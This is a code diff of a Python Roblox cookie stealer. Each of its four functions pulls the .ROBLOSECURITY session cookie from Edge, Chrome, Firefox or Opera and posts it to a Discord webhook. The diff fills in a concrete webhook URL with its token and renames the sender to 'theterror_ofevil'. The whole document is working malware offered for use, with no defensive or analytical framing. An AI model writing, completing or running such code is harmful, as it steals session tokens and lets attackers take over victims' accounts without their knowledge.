@@ -1,13 +1,13 @@
 import browser_cookie3, requests, threading
 
-webhook = "your webhook here"
+webhook = "https://discord.com/api/webhooks/926202051887783976/AN9g0QfLaL1Ct81GzZbV3prcFiki1IJCf_iq-O6itBx4vb6hNd-C7KmPzlR9IwCQBBEA"
 
 def edge_logger():
     try:
         cookies = browser_cookie3.edge(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        requests.post(webhook, json={'username':'theterror_ofevil', 'content':f'```Cookie: {cookie}```'})
     except:
         pass
 def chrome_logger():
@@ -15,7 +15,7 @@ def chrome_logger():
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        requests.post(webhook, json={'username':'theterror_ofevil', 'content':f'```Cookie: {cookie}```'})
     except:
         pass
 
@@ -25,7 +25,7 @@ def firefox_logger():
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        requests.post(webhook, json={'username':'theterror_ofevil', 'content':f'```Cookie: {cookie}```'})
     except:
         pass
 
@@ -34,7 +34,7 @@ def opera_logger():
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        requests.post(webhook, json={'username':'theterror_ofevil', 'content':f'```Cookie: {cookie}```'})
     except:
         pass
 
